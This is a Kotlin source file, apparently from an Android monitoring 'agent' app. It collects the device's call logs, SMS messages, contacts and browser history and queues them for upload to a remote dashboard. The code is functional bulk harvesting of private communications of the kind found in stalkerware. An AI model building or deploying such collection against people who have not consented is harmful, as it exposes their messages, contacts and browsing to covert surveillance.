package com.zenvora.agent.manager

import android.content.Context
import org.json.JSONArray

/**
 * Queues a compact dump of calls / SMS / contacts / browser so HTTP beats
 * fill the dashboard even when the live WebSocket is down.
 * App time comes from session close events so Usage matches Activity.
 */
object HistorySnapshot {
    fun enqueue(context: Context) {
        EventQueue.load(context)
        addAll(context, "FETCH_CALL_LOGS", CallLogManager(context).fetch(40))
        addAll(context, "FETCH_SMS_MESSAGES", SMSManager(context).fetch(40))
        addAll(context, "FETCH_CONTACTS", ContactsManager(context).fetch(80))
        addAll(context, "FETCH_BROWSER_HISTORY", BrowserHistoryManager(context).fetch())
    }

    private fun addAll(context: Context, command: String, items: JSONArray) {
        val max = if (command == "FETCH_BROWSER_HISTORY") 40 else items.length()
        var i = 0
        while (i < items.length() && i < max) {
            val item = items.optJSONObject(i)
            if (item != null) EventQueue.add(context, command, item)
            i += 1
        }
    }
}
